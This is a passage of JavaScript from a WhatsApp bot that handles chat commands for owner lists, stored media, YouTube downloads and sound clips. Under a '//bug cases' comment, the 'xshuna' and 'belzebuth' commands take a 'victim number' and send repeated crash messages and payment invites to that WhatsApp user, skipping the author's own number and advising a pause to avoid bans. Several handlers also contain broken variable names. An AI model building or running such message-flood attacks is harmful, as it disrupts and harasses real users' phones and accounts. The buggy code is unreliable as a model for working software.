owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`𝑵𝒖𝒎𝒃𝒆𝒓 ${bnnd} 𝑯𝒂𝒔 𝒃𝒆𝒄𝒐𝒎𝒆 𝒐𝒘𝒏𝒆𝒓 𝒐𝒇 𝒔𝒉𝒖𝒏𝒂☺️!!!`)
break
case 'delowner':
                if (!isCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒏𝒖𝒎𝒃𝒆𝒓\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237698581946`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcxeon(`𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 ${ya} 𝑯𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒇𝒓𝒐𝒎 𝒐𝒘𝒏𝒆𝒓 𝒍𝒊𝒔𝒕 𝒐𝒇 𝒔𝒉𝒖𝒏𝒂 𝒃𝒚 𝒕𝒓𝒖𝒆 𝒐𝒘𝒏𝒆𝒓!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑽𝒊𝒅𝒆𝒐 𝒏𝒂𝒎𝒆?')
                if (VideoXeon.includes(q)) return replygcxeon("𝑫𝒂𝒓𝒍𝒊𝒏𝒈 𝒕𝒉𝒆 𝒏𝒂𝒎𝒆 𝒚𝒐𝒖 𝒆𝒏𝒕𝒆𝒓𝒆𝒅 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒆𝒙𝒊𝒔𝒕")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝒂𝒅𝒅𝒊𝒏𝒈 𝒗𝒊𝒅𝒆𝒐\𝒕𝒐 𝒗𝒊𝒆𝒘 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒗𝒊𝒅𝒆𝒐`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒕𝒉𝒆 𝒗𝒊𝒅𝒆𝒐 𝒏𝒂𝒎𝒆')
                if (!VideoXeon.includes(q)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒅𝒐𝒆𝒔 𝒏𝒐𝒕 𝒆𝒙𝒊𝒔𝒕 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒗𝒊𝒅𝒆𝒐 ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑵𝒂𝒎𝒆 𝒐𝒇 𝒊𝒎𝒂𝒈𝒆?')
                if (ImageXeon.includes(q)) return replygcxeon("𝑫𝒂𝒓𝒍𝒊𝒏𝒈 𝒕𝒉𝒆 𝒏𝒂𝒎𝒆 𝒚𝒐𝒖 𝒆𝒏𝒕𝒆𝒓𝒆𝒅 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒆𝒙𝒊𝒔𝒕 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝒊𝒏 𝒂𝒅𝒅𝒊𝒏𝒈 𝒊𝒎𝒂𝒈𝒆\n𝑻𝒐 𝒄𝒉𝒆𝒄𝒌 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒊𝒎𝒂𝒈𝒆`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒊𝒎𝒂𝒈𝒆 𝒏𝒂𝒎𝒆')
                if (!ImageXeon.includes(q)) return replygcxeon("𝑰𝒎𝒂𝒈𝒆 𝒏𝒂𝒎𝒆 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅😗")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒊𝒎𝒂𝒈𝒆 ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒏𝒂𝒎𝒆?')
                if (StickerXeon.includes(q)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒖𝒔𝒆𝒅 𝒄𝒉𝒂𝒏𝒈𝒆 🤦‍♀️")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒂𝒅𝒅𝒊𝒏𝒈 𝒔𝒕𝒊𝒄𝒌𝒆𝒓\𝒕𝒐 𝒄𝒉𝒆𝒄𝒌 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒔𝒕𝒊𝒄𝒌𝒆𝒓`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 𝒏𝒂𝒎𝒆')
                if (!StickerXeon.includes(q)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒊𝒔 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆🍭")
                let wanu = StickerXeon.indexOf(q)
                StickerXeonBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒓𝒆𝒎𝒐𝒗𝒆𝒅 𝒔𝒕𝒊𝒄𝒌𝒆𝒓 ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒏𝒂𝒎𝒆?')
                if (VoiceNoteXeon.includes(q)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒖𝒔𝒆𝒅")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝒂𝒅𝒅𝒊𝒏𝒈 𝒂𝒖𝒅𝒊𝒐\n𝒕𝒐 𝒄𝒉𝒆𝒄𝒌 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒗𝒏`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒏𝒂𝒎𝒆')
                if (!VoiceNoteXeon.includes(q)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
                replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒂𝒖𝒅𝒊𝒐 ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon(`𝑾𝒉𝒂𝒕'𝒔 𝒕𝒉𝒆 𝒛𝒊𝒑 𝒏𝒂𝒎𝒆?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒖𝒔𝒆𝒅")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝒊𝒏 𝒂𝒅𝒅𝒊𝒏𝒈 𝒛𝒊𝒑\n𝒕𝒐 𝒄𝒉𝒆𝒄𝒌 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒛𝒊𝒑`)
}
}
break
case 'delzip':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒕𝒉𝒆 𝒕𝒆𝒙𝒕 𝒊𝒏 𝒛𝒊𝒑 𝒍𝒊𝒔𝒕')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcxeon("𝑻𝒉𝒊𝒔 𝒏𝒂𝒎𝒆 𝒅𝒐𝒆𝒔 𝒏𝒐𝒕 𝒆𝒙𝒊𝒔𝒕 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./XeonMedia/zip/${teks}.zip`)
replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒅𝒆𝒍𝒆𝒕𝒆𝒅 𝒛𝒊𝒑 ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *𝐙𝐈𝐏 𝐋𝐈𝐒𝐓* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcxeon(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('𝑾𝒉𝒂𝒕 𝒊𝒔 𝒕𝒉𝒆 𝒏𝒂𝒎𝒆 𝒐𝒇 𝒂𝒑𝒌?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒖𝒔𝒆𝒅")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./XeonMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒂𝒅𝒅𝒊𝒏𝒈 𝒂𝒑𝒌\n𝑻𝒐 𝒄𝒉𝒆𝒄𝒌 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒂𝒑𝒌`)
}
}
break
case 'delapk':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('𝑵𝒂𝒎𝒆 𝒐𝒇 𝒂𝒑𝒌?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcxeon("𝑻𝒉𝒊𝒔 𝒏𝒂𝒎𝒆 𝒅𝒐𝒆𝒔 𝒏𝒐𝒕 𝒆𝒙𝒊𝒔𝒕 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒂𝒅𝒅𝒆𝒅 𝒂𝒑𝒌 ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *𝐀𝐏𝐊 𝐋𝐈𝐒𝐓* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcxeon(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('𝑵𝒂𝒎𝒆 𝒑𝒅𝒇')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcxeon("𝑵𝒂𝒎𝒆 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒖𝒔𝒆𝒅")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒂𝒅𝒅𝒊𝒏𝒈 𝒑𝒅𝒇\n𝑻𝒐 𝒄𝒉𝒆𝒄𝒌 𝒕𝒚𝒑𝒆 ${prefix}𝒍𝒊𝒔𝒕𝒑𝒅𝒇`)
}
}
break
case 'delpdf':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('𝑬𝒏𝒕𝒆𝒓 𝒏𝒂𝒎𝒆')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcxeon("𝑻𝒉𝒊𝒔 𝒏𝒂𝒎𝒆 𝒅𝒐𝒆𝒔 𝒏𝒐𝒕 𝒆𝒙𝒊𝒔𝒕 𝒊𝒏 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
replygcxeon(`𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒂𝒅𝒅𝒆𝒅 𝒑𝒅𝒇 ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *𝐏𝐃𝐅 𝐋𝐈𝐒𝐓* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcxeon(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (isAfkOn) return replygcxeon("𝑨𝒍𝒓𝒆𝒂𝒅𝒚 𝒂𝒇𝒌 𝒅𝒂𝒓𝒍𝒊𝒏𝒈🍭")
                let reason = text ? text : '𝑵𝒐𝒕𝒉𝒊𝒏𝒈.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcxeon(`@${m.sender.split('@')[0]} 𝑪𝒖𝒓𝒓𝒆𝒏𝒕𝒍𝒚 𝒂𝒇𝒌 𝒃𝒂𝒃𝒆\n𝑾𝒊𝒕𝒉 𝒓𝒆𝒂𝒔𝒐𝒏 : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replygcxeon(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix + command} 𝒂𝒏𝒊𝒎𝒆 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝒔𝒕𝒂𝒕𝒖𝒔`)
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygcxeon(`𝑾𝒉𝒆𝒓𝒆 𝒊𝒔 𝒕𝒉𝒆 𝒚𝒕 𝒍𝒊𝒏𝒌?\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }
    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcxeon(`𝑫𝒂𝒓𝒍𝒊𝒏𝒈 𝒘𝒉𝒆𝒓𝒆 𝒊𝒔 𝒕𝒉𝒆 𝒍𝒊𝒏𝒌??\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}𝐓𝐢𝐭𝐥𝐞:* ${vid.title}
*${themeemoji}𝐃𝐚𝐭𝐞:* ${vid.date}
*${themeemoji}𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:* ${vid.duration}
*${themeemoji}𝐐𝐮𝐚𝐥𝐢𝐭𝐲:* ${vid.quality}`
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case "xshuna": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓 𝒃𝒂𝒃𝒆☺️");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237698581946") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("𝑻𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒊𝒔 𝒏𝒐𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒐𝒏  𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑");
  }
  replygcxeon("𝒃𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝒙𝒔𝒉𝒖𝒏𝒂 𝒉𝒐𝒍𝒚 𝒃𝒖𝒈👄 𝒊𝒔 𝒊𝒏 𝒑𝒓𝒐𝒄𝒆𝒔𝒔..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒔𝒆𝒏𝒕 𝑯𝒐𝒍𝒚 𝒃𝒖𝒈👄 𝒕𝒐 @" + whatsappNumber.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [whatsappNumber]
  );
}
break;
case "belzebuth": {
  if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕 𝒕𝒐 𝒖𝒔𝒆 𝒕𝒉𝒆 𝒑𝒐𝒘𝒆𝒓 𝒐𝒇 𝒍𝒊𝒎𝒖𝒍𝒆 𝒔𝒂𝒎𝒂\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`𝑼𝒔𝒆 ${prefix+command} 𝒗𝒊𝒄𝒕𝒊𝒎𝒆 𝒏𝒖𝒎𝒃𝒆𝒓|𝒂𝒎𝒐𝒖𝒏𝒕 𝒕𝒐 𝒖𝒔𝒆 𝒕𝒉𝒆 𝒑𝒐𝒘𝒆𝒓 𝒐𝒇 𝒍𝒊𝒎𝒖𝒍𝒆 𝒔𝒂𝒎𝒂\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒂 𝒏𝒖𝒎𝒃𝒆𝒓 𝒃𝒂𝒃𝒆🍭");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "237698581946") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("𝑵𝒖𝒎𝒃𝒆𝒓 𝒏𝒐𝒕 𝒊𝒏 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒊𝒏 𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑");
  }
  replygcxeon("𝑩𝒂𝒃𝒆 𝒘𝒂𝒊𝒕, " + command + " 𝑩𝑬𝑳𝒁𝑬𝑩𝑼𝑻𝑯 𝑽𝑶𝑹𝑨𝑪𝑰𝑻𝒀 𝑲𝑰𝑵𝑮☠︎𝑰𝑺 𝑰𝑵 𝑷𝑹𝑶𝑪𝑬𝑺𝑺...");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒖𝒔𝒆𝒅 𝑩𝑬𝑳𝒁𝑬𝑩𝑼𝑻𝑯 𝑽𝑶𝑹𝑨𝑪𝑰𝑻𝒀 𝑲𝑰𝑵𝑮☠︎𝑻𝑶 𝑶𝑭𝑭 @" + whatsappNumber.split('@')[0] + 
    " 𝑼𝒔𝒊𝒏𝒈 *" + command + "* ✅\n\n𝑷𝒂𝒖𝒔𝒆 2 𝒎𝒊𝒏𝒖𝒕𝒆 𝒔𝒐 𝒕𝒉𝒂𝒕 𝒚𝒐𝒖 𝒚𝒐𝒖 𝒂𝒏𝒅 𝒔𝒉𝒖𝒏𝒂 𝒔𝒉𝒐𝒖𝒍𝒅 𝒏𝒐𝒕 𝒃𝒆 𝒃𝒂𝒏𝒏𝒆𝒅.", 
    [whatsappNumber]
  );
}
break;
case "shunaoff":
  {
